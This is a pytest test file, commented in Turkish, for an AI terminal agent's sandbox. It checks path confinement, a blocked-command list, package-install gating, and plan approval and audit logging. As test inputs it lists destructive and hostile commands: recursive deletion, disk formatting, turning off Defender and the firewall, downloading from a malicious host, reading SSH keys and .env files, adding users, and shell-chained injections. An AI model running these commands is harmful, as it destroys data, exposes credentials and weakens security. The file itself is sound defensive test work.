"""AI Terminali güvenlik sınırı testleri.

Bu testler ürünün en kritik güvenlik kontrolünü doğrular: yapay zekâ
`D:\\Wine` dışına yazamaz ve yıkıcı komut çalıştıramaz.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from httpx import AsyncClient

from app.agent.sandbox import (
    SandboxViolation,
    assess_plan,
    check_command,
    is_within_workspace,
    safe_path,
    workspace_root,
)
from app.core.config import settings as yapilandirma


# ------------------------------------------------------------- YOL HAPSİ
@pytest.mark.parametrize(
    "yol",
    [
        "C:\\Windows\\System32",
        "C:\\Users\\Public\\gizli.txt",
        "..\\..\\baska_klasor",
        "D:\\BaskaProje\\dosya.py",
        "\\\\sunucu\\paylasim\\dosya",
        "%USERPROFILE%\\.ssh\\id_rsa",
        "/etc/passwd",
    ],
)
def test_calisma_alani_disi_yollar_reddedilir(yol: str):
    assert not is_within_workspace(yol), f"{yol} çalışma alanı dışı sayılmalıydı"
    with pytest.raises(SandboxViolation):
        safe_path(yol)


@pytest.mark.parametrize(
    "yol",
    ["backend/app/main.py", "docs", ".", "frontend/src", "backend\\app\\core\\config.py"],
)
def test_calisma_alani_ici_yollar_kabul_edilir(yol: str):
    assert is_within_workspace(yol)
    assert safe_path(yol).is_relative_to(workspace_root())


def test_ust_dizine_cikma_normalize_edilerek_engellenir():
    assert not is_within_workspace("backend/../../disari")
    # Ancak calisma alani icinde kalan `..` kullanimi gecerlidir
    assert is_within_workspace("backend/app/../app/main.py")


def test_sembolik_yol_cozumlemesi_calisma_alanina_gore_yapilir():
    root = workspace_root()
    assert safe_path("backend/./app/../app").resolve() == (root / "backend" / "app").resolve()


# --------------------------------------------------------- YASAKLI KOMUTLAR
@pytest.mark.parametrize(
    ("komut", "beklenen_ipucu"),
    [
        ("rm -rf /", "silme"),
        ("rm -rf backend", "silme"),
        ("del /s /q D:\\Wine", "silme"),
        ("Remove-Item -Recurse -Force D:\\", "silme"),
        ("format C:", "biçimlendirme"),
        ("reg add HKLM\\Software\\Test", "Kayıt defteri"),
        ("netsh advfirewall set allprofiles state off", "Güvenlik"),
        ("Set-MpPreference -DisableRealtimeMonitoring $true", "Güvenlik"),
        ("shutdown /s /t 0", "kapatma"),
        ("taskkill /F /IM python.exe", "Süreç"),
        ("curl http://kotu.site/script.ps1", "indirme"),
        ("Invoke-WebRequest -Uri http://x/y -OutFile z", "indirme"),
        ("git push origin main", "gönderim"),
        ("npm publish", "yayınlama"),
        ("alembic downgrade -1", "geri alma"),
        ("type .env", "anahtar"),
        ("cat ~/.ssh/id_rsa", "Kimlik"),
        ("net user hacker /add", "yetki"),
        ("icacls D:\\Wine /grant Everyone:F", "izni"),
    ],
)
def test_yikici_komutlar_engellenir(komut: str, beklenen_ipucu: str):
    verdict = check_command(komut)
    assert verdict.allowed is False, f"ENGELLENMELİYDİ: {komut}"
    assert verdict.risk == "engellendi"
    assert beklenen_ipucu.lower() in verdict.reason.lower(), verdict.reason


@pytest.mark.parametrize(
    "komut",
    [
        "python -m pytest -q && rm -rf backend",
        "git status; del /q *.py",
        "python script.py | curl http://kotu.site",
        "echo test > D:\\baska\\dosya.txt",
        "python -c $(kotu_komut)",
        "pytest & shutdown /s",
    ],
)
def test_kabuk_zincirleme_engellenir(komut: str):
    """Zincirleme operatörleri izin listesini atlatmayı mümkün kılardı."""
    verdict = check_command(komut)
    assert verdict.allowed is False
    assert "operatör" in verdict.reason or "Yasaklı" in verdict.reason


def test_izin_listesi_disi_calistirilabilir_engellenir():
    verdict = check_command("powershell -Command Get-Process")
    assert verdict.allowed is False
    assert "izin listesinde değil" in verdict.reason


def test_cok_satirli_komut_engellenir():
    verdict = check_command("python x.py\nrm -rf /")
    assert verdict.allowed is False
    assert "Çok satırlı" in verdict.reason


def test_sistem_dizini_iceren_komut_engellenir():
    verdict = check_command("python C:\\Windows\\System32\\kotu.py")
    assert verdict.allowed is False
    assert verdict.matched_rule == "Sistem dizini erişimi"


def test_calisma_alani_disi_yol_iceren_komut_yol_hapsine_takilir():
    """Kara listeye takılmayan ama çalışma alanı dışında olan yol da engellenmeli."""
    verdict = check_command("python D:\\BaskaProje\\betik.py")
    assert verdict.allowed is False
    assert verdict.matched_rule == "yol_hapsi"
    assert "çalışma alanı" in verdict.reason.lower()


def test_git_yikici_alt_komutlari_engellenir():
    for komut in ("git clean -fdx", "git remote add x y", "git gc --prune=now"):
        verdict = check_command(komut)
        assert verdict.allowed is False, komut


# -------------------------------------------------------- İZİN VERİLENLER
@pytest.mark.parametrize(
    "komut",
    [
        "python -m pytest -q",
        "python -m ruff check backend",
        "python -m mypy backend/app",
        "git status",
        "git diff --stat",
        "git add -A",
        "npm run build",
        "node --version",
        "alembic upgrade head",
    ],
)
def test_gelistirme_komutlari_izinli(komut: str):
    verdict = check_command(komut)
    assert verdict.allowed is True, f"{komut} → {verdict.reason}"


def test_yuksek_riskli_komutlar_isaretlenir():
    for komut in ("git reset --hard HEAD~1", "alembic upgrade head"):
        verdict = check_command(komut)
        assert verdict.allowed is True
        assert verdict.risk == "yuksek", komut


# ------------------------------------------------------- PAKET KURULUM KAPISI
# Paket kurulumu, paketin kendi kurulum betigini calistirir; bu betik izin
# listesinin de yol hapsinin de disindadir. Bu yuzden VARSAYILAN OLARAK
# ENGELLENIR ve yalnizca acik bir ayarla acilir.
@pytest.mark.parametrize(
    "komut",
    ["pip install requests", "npm install", "npm ci", "npx playwright test"],
)
def test_paket_kurulumu_varsayilan_olarak_engellenir(
    komut: str, monkeypatch: pytest.MonkeyPatch
):
    monkeypatch.setattr(yapilandirma, "AGENT_ALLOW_PACKAGE_INSTALL", False)
    verdict = check_command(komut)
    assert verdict.allowed is False, (
        f"{komut} engellenmeliydi: kurulum betigi izin listesini atlatir"
    )
    assert verdict.matched_rule is not None
    assert "paket_kurulumu" in verdict.matched_rule


@pytest.mark.parametrize(
    "komut",
    ["pip install requests", "npm install", "npm ci", "npx playwright test"],
)
def test_paket_kurulumu_acik_ayarla_izin_verilir_ve_yuksek_risklidir(
    komut: str, monkeypatch: pytest.MonkeyPatch
):
    """Bilincli olarak acildiginda calisir, ancak DAIMA yuksek risk isaretlenir."""
    monkeypatch.setattr(yapilandirma, "AGENT_ALLOW_PACKAGE_INSTALL", True)
    verdict = check_command(komut)
    assert verdict.allowed is True, verdict.reason
    assert verdict.risk == "yuksek", komut


def test_paket_yayinlama_ayar_acikken_bile_engelli(monkeypatch: pytest.MonkeyPatch):
    """Kurulum izni, yayinlama/oturum komutlarini ACMAZ."""
    monkeypatch.setattr(yapilandirma, "AGENT_ALLOW_PACKAGE_INSTALL", True)
    for komut in ("npm publish", "npm login", "npm token list"):
        assert check_command(komut).allowed is False, komut


def test_bos_komut_reddedilir():
    assert check_command("").allowed is False
    assert check_command("   ").allowed is False


# ------------------------------------------------------------ PLAN RİSKİ
def test_yikici_plan_engellendi_olarak_isaretlenir():
    risk, reasons, _ = assess_plan(["rm -rf backend"], ["backend/app/main.py"])
    assert risk == "engellendi"
    assert any("ENGELLENDİ" in r for r in reasons)


def test_calisma_alani_disi_dosya_plani_engellenir():
    risk, reasons, _ = assess_plan(["python -m pytest"], ["C:\\Windows\\hosts"])
    assert risk == "engellendi"
    assert any("Çalışma alanı dışı" in r for r in reasons)


def test_hassas_dosya_degisikligi_yuksek_risk():
    risk, reasons, _ = assess_plan(
        ["python -m pytest -q"], ["backend/app/agent/sandbox.py"]
    )
    assert risk == "yuksek"
    assert any("Hassas dosya" in r for r in reasons)


def test_guvenli_plan_dusuk_veya_orta_risk():
    risk, _, verdicts = assess_plan(["git status"], ["docs/README.md"])
    assert risk in ("dusuk", "orta")
    assert all(v.allowed for v in verdicts)


# ------------------------------------------------------------ API TESTLERİ
async def test_terminal_durumu(client: AsyncClient, admin_headers):
    response = await client.get("/api/v1/terminal/status", headers=admin_headers)
    assert response.status_code == 200
    body = response.json()
    assert Path(body["workspace"]).resolve() == workspace_root()
    assert body["require_approval"] is True
    assert "python" in body["allowed_commands"]
    assert len(body["blocked_patterns"]) > 10


async def test_komut_onizleme_engelli_komutu_bildirir(client: AsyncClient, admin_headers):
    response = await client.post(
        "/api/v1/terminal/check", json={"command": "rm -rf D:\\Wine"}, headers=admin_headers
    )
    assert response.status_code == 200
    assert response.json()["allowed"] is False
    assert response.json()["risk"] == "engellendi"


async def test_engelli_plan_onaylanamaz(client: AsyncClient, admin_headers):
    plan = await client.post(
        "/api/v1/terminal/plan",
        json={
            "request_text": "Tüm dosyaları sil",
            "proposed_commands": ["rm -rf backend"],
            "use_llm": False,
        },
        headers=admin_headers,
    )
    assert plan.status_code == 201
    body = plan.json()
    assert body["risk_level"] == "engellendi"
    assert body["status"] == "reddedildi"

    approval = await client.post(
        f"/api/v1/terminal/{body['id']}/approval",
        json={"approve": True},
        headers=admin_headers,
    )
    assert approval.status_code == 409
    assert "engellendi" in approval.json()["detail"]


async def test_onaysiz_calistirma_reddedilir(client: AsyncClient, admin_headers):
    plan = await client.post(
        "/api/v1/terminal/plan",
        json={
            "request_text": "Testleri çalıştır",
            "proposed_commands": ["python -m pytest --version"],
            "use_llm": False,
        },
        headers=admin_headers,
    )
    task_id = plan.json()["id"]
    assert plan.json()["risk_level"] in ("dusuk", "orta")

    run = await client.post(f"/api/v1/terminal/{task_id}/run", headers=admin_headers)
    assert run.status_code == 409
    assert "onaylanmalıdır" in run.json()["detail"]


async def test_tek_komut_calisma_alani_disi_reddedilir(client: AsyncClient, admin_headers):
    response = await client.post(
        "/api/v1/terminal/run-once",
        json={"command": "python --version", "cwd": "C:\\Windows"},
        headers=admin_headers,
    )
    assert response.status_code == 403
    assert "dışında olamaz" in response.json()["detail"]


async def test_engellenen_komut_denetim_gunlugune_yazilir(client: AsyncClient, admin_headers):
    await client.post(
        "/api/v1/terminal/run-once",
        json={"command": "format D:"},
        headers=admin_headers,
    )
    audit = await client.get(
        "/api/v1/audit", params={"action": "terminal_komut"}, headers=admin_headers
    )
    assert any("Engellenen komut" in i["summary"] for i in audit.json()["items"])


async def test_calisma_alani_disina_yazma_gercekten_engellenir(
    client: AsyncClient, admin_headers, tmp_path
):
    """Uçtan uca kanıt: sandbox dışına dosya yazma denemesi başarısız olmalı."""
    hedef = tmp_path / "sizinti.txt"
    response = await client.post(
        "/api/v1/terminal/run-once",
        json={"command": f'python -c "open(r\'{hedef}\',\'w\').write(\'x\')"'},
        headers=admin_headers,
    )
    # Ya politika engeller (403) ya da komut yol kontrolüne takılır
    assert response.status_code == 403, response.text
    assert not hedef.exists(), "Çalışma alanı dışına dosya yazıldı — güvenlik ihlali!"
